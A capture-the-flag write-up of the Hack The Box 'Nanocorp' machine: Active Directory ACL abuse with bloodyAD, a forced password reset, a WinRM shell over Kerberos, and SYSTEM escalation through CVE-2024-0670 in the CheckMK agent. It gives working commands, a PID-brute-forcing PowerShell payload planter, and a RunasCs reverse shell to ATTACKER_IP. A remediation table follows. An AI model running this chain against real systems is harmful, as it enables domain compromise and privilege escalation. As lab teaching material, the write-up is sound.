# Hack The Box: Nanocorp Write-Up

### Active Directory Permission Abuse and CheckMK Agent Exploitation (CVE-2024-0670)

- **Target Hostname:** dc01.nanocorp.htb
- **Domain:** nanocorp.htb
- **Operating System:** Windows Server (Active Directory Domain Controller)
- **Primary Vector:** Active Directory Misconfiguration (ACL Abuse)
- **Secondary Vectors:** WinRM Access, Local Privilege Escalation (CVE-2024-0670)

---

## Executive Summary

The Nanocorp machine simulates a tightly constrained Active Directory environment that succumbs to a methodical chain of permission abuse and local privilege escalation. The attack initiates with a low-privilege service account that possesses excessive Access Control List (ACL) permissions, allowing it to modify a privileged security group. This access facilitates lateral movement to a secondary service account, which is subsequently used to establish a WinRM session on the Domain Controller. Finally, a local privilege escalation is achieved by exploiting CVE-2024-0670 in the CheckMK monitoring agent, leveraging a race condition and insecure temporary file handling to execute arbitrary code as `NT AUTHORITY\SYSTEM`.

This write-up details the full attack chain, providing technical context for both offensive operators and defensive analysts.

---

## 1. Initial Foothold: Active Directory Permission Abuse

The engagement begins with valid credentials for a low-privilege service account.

- **Username:** `web_svc`
- **Password:** `dksehdgh712!@#`
- **Domain:** `nanocorp.htb`

### ACL Enumeration and Abuse
Using `bloodyAD`, we enumerate the effective permissions of the `web_svc` account and identify a critical misconfiguration: the account possesses `GenericWrite` privileges over the `IT_support` security group. This permission allows the account to modify the group's membership, including adding itself.

**Exploitation:**
```bash
bloodyAD --host dc01.nanocorp.htb \
  -d nanocorp.htb \
  -u web_svc \
  -p 'dksehdgh712!@#' \
  add groupMember 'IT_support' web_svc
```

> **Analysis:** In Active Directory, group membership is directly correlated with privilege. By adding `web_svc` to `IT_support`, the account inherits the elevated rights assigned to that group, which includes the ability to reset passwords for other service accounts.

---

## 2. Lateral Movement: Service Account Password Reset

As a newly minted member of the `IT_support` group, we leverage our elevated permissions to reset the password of another service account, `monitoring_svc`.

**Exploitation:**
```bash
bloodyAD --host dc01.nanocorp.htb \
  -d nanocorp.htb \
  -u web_svc \
  -p 'dksehdgh712!@#' \
  set password monitoring_svc 'test0@Ad'
```

We now possess valid credentials for two distinct domain accounts, expanding our operational capabilities within the environment.

---

## 3. Host Access: WinRM and Kerberos Authentication

Enumeration reveals that the `monitoring_svc` account has been granted WinRM (Windows Remote Management) access to the Domain Controller. We utilize Kerberos authentication to establish a stable, interactive shell.

### Ticket Acquisition and Connection
**1. Obtain a Kerberos TGT:**
```bash
impacket-getTGT -dc-ip 10.129.96.13 nanocorp.htb/'monitoring_svc':'test0@Ad'
# Saves ticket as: monitoring_svc.ccache
```

**2. Connect via WinRM:**
```bash
export KRB5CCNAME=monitoring_svc.ccache
python3 winrmexec.py -k -no-pass -ssl dc01.nanocorp.htb
```

**Result:**
```powershell
PS C:\Users\monitoring_svc> whoami
nanocorp\monitoring_svc
```

We have successfully established a stable shell on the Domain Controller.

---

## 4. Privilege Escalation: CheckMK Agent Exploitation (CVE-2024-0670)

### 4.1 Service Enumeration
A local port scan reveals an internal service listening on port 6556.

```bash
nmap -p6556 localhost
```

Querying the service identifies it as the CheckMK monitoring agent (Version: 2.1.0p10). This specific version is vulnerable to **CVE-2024-0670**, a local privilege escalation flaw.

### 4.2 Vulnerability Mechanics
When the CheckMK agent starts, it generates temporary `.cmd` files in `C:\Windows\Temp` (following the naming convention `cmk_all_<PID>_1.cmd`) and executes them with `NT AUTHORITY\SYSTEM` privileges. 

If an attacker pre-creates a read-only `.cmd` file with a predictable name matching the agent's process ID (PID), the agent will inadvertently execute the malicious payload as SYSTEM upon startup.

### 4.3 Operational Constraint: The Dual-Shell Requirement
To trigger the vulnerability, the CheckMK agent service must be restarted to generate a new PID and corresponding temporary file. However, the `monitoring_svc` account lacks the permissions to restart the service. Enumeration reveals that the original `web_svc` account possesses the necessary rights to trigger the restart.

This necessitates a dual-shell approach:
- **Shell 1 (`monitoring_svc`):** Used to plant the malicious payload in the temp directory.
- **Shell 2 (`web_svc`):** Used to restart the CheckMK agent service.

### 4.4 Establishing the Secondary Shell
From our `monitoring_svc` WinRM session, we upload and execute `RunasCs.exe` to spawn a reverse shell as `web_svc`.

```powershell
.\RunasCs.exe 'WEB_SVC' 'dksehdgh712!@#' cmd.exe -r ATTACKER_IP:4444
```

### 4.5 Exploitation Execution

**Step 1: Payload Preparation**
We compile a minimal C program designed to read the root flag and write it to a readable directory.

```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    system("type C:\\Users\\Administrator\\Desktop\\root.txt > C:\\test\\proof.txt");
    return 0;
}
```

**Step 2: File Deployment**
In **Shell 1** (`monitoring_svc`), we upload the compiled binary (`test.exe`) and a PowerShell script (`temp.ps1`) designed to brute-force the PID and plant the payload.

```powershell
# temp.ps1
Remove-Item -Path "C:\Windows\Temp\cmd*" -Force -ErrorAction SilentlyContinue
while ($true) {
    1000..10000 | ForEach-Object {
        $dest = "C:\Windows\Temp\cmk_all_${_}_1.cmd"
        Copy-Item -Path "C:\Users\monitoring_svc\AppData\Local\Temp\test.exe" -Destination $dest -Force
        Set-ItemProperty -Path $dest -Name IsReadOnly -Value $true
    }
}
```

**Step 3: Directory Flooding**
We execute the script in **Shell 1**, flooding `C:\Windows\Temp` with thousands of read-only `.cmd` files covering the potential PID range.

**Step 4: Triggering the Restart**
In **Shell 2** (`web_svc`), we force the CheckMK agent to restart using the Windows Installer.

```powershell
msiexec /fa C:\Windows\Installer\1e6f2.msi
```

The agent restarts with a new PID (e.g., `8132`). It searches for `cmk_all_8132_1.cmd`, locates our pre-planted read-only file, and executes it as `SYSTEM`.

**Step 5: Flag Retrieval**
Returning to **Shell 1**, we verify the execution and retrieve the flag.

```powershell
type C:\test\proof.txt
```

**Result:**
The contents of `root.txt` are successfully extracted, confirming full system compromise.

---

## 5. Vulnerability Analysis & Remediation (Blue Team)

| Vulnerability | Impact | Remediation Strategy |
| :--- | :--- | :--- |
| **Excessive `GenericWrite` on AD Group** | Allows low-privilege accounts to add themselves to privileged groups. | Apply the Principle of Least Privilege; regularly audit group management permissions and ACLs using tools like BloodHound. |
| **Service Account Password Reset Rights** | Enables lateral movement between service accounts. | Restrict password reset rights exclusively to Tier 0/1 administrators; implement Protected Users groups. |
| **CheckMK Agent Running as SYSTEM** | Local privilege escalation via insecure temp file execution. | Run monitoring agents under dedicated, least-privilege service accounts; apply vendor patches immediately. |
| **Predictable Temp File Naming** | Enables race condition and file planting exploitation. | Utilize secure, randomized temporary file paths with strict Access Control Lists (ACLs) preventing unauthorized modification. |

---

## 6. Key Takeaways

1. **AD Permissions Dictate Privilege:** A single misconfigured ACL, such as `GenericWrite` on a security group, can cascade into full domain compromise if not strictly governed.
2. **Service Accounts are High-Value Targets:** Service accounts often possess unexpected privileges or are targeted for password resets due to weak delegation models.
3. **Local Exploits Require Operational Flexibility:** Complex local privilege escalations, like CVE-2024-0670, may require multiple concurrent sessions and precise coordination to bypass operational constraints.
4. **Monitoring Agents Expand the Attack Surface:** Third-party monitoring tools running as `SYSTEM` are prime targets for local privilege escalation. They must be patched rigorously and run with minimal necessary privileges.
5. **Defense-in-Depth is Mandatory:** Mitigating any single layer in this chain—whether fixing the AD delegation, restricting WinRM, or patching the CheckMK agent—would have successfully halted the attack.

> "It is not the size of the machine, but the misconfigurations you exploit along the way."

**Box Rating:** 4.5/5 — Realistic, clever, and packed with modern Active Directory and local exploitation tradecraft.
